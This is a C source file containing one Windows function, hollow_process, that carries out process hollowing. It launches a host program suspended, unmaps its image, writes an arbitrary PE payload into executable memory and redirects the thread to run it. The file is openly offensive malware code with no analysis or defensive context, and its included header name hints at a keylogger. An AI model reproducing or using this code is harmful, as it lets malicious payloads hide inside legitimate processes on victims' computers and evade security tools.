#include "winkey.h"



BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
{
	STARTUPINFOW si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);

	if (!CreateProcessW(hostPath, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return FALSE;

	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
		goto cleanup;
	PFN_NtQueryInformationProcess NtQueryInformationProcess =
		(PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	PFN_NtUnmapViewOfSection NtUnmapViewOfSection =
		(PFN_NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	if (!NtQueryInformationProcess || !NtUnmapViewOfSection)
		goto cleanup;

	PROCESS_BASIC_INFORMATION pbi;
	ULONG retLen = 0;
	if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen) != 0)
		goto cleanup;
	PEB remotePeb;
	if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(remotePeb), NULL))
		goto cleanup;
	PVOID imageBase = remotePeb.Reserved3[1];
	if (NtUnmapViewOfSection(pi.hProcess, imageBase) != 0)
		goto cleanup;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)payload + dos->e_lfanew);
	SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
	LPVOID remoteBase = VirtualAllocEx(pi.hProcess, imageBase, totalSize, MEM_COMMIT | MEM_RESERVE,
									   PAGE_EXECUTE_READWRITE);
	if (!remoteBase)
		goto cleanup;
	if (!WriteProcessMemory(pi.hProcess, remoteBase, payload, nt->OptionalHeader.SizeOfHeaders, NULL))
		goto cleanup;
	PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
	{
		LPVOID dest = (BYTE*)remoteBase + sec->VirtualAddress;
		LPVOID src  = (BYTE*)payload + sec->PointerToRawData;
		if (sec->SizeOfRawData == 0)
			continue;
		if (!WriteProcessMemory(pi.hProcess, dest, src, sec->SizeOfRawData, NULL))
			goto cleanup;
	}
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pi.hThread, &ctx))
		goto cleanup;
#ifdef _M_X64
	// 10. Mettre RIP sur le nouvel entrypoint
	ctx.Rip = (DWORD64)((BYTE*)remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
#else
	ctx.Eax = (DWORD)((BYTE*)remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
#endif

	if (!SetThreadContext(pi.hThread, &ctx))
		goto cleanup;
	ResumeThread(pi.hThread);
	return TRUE;
cleanup:
	TerminateProcess(pi.hProcess, 0);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return FALSE;
}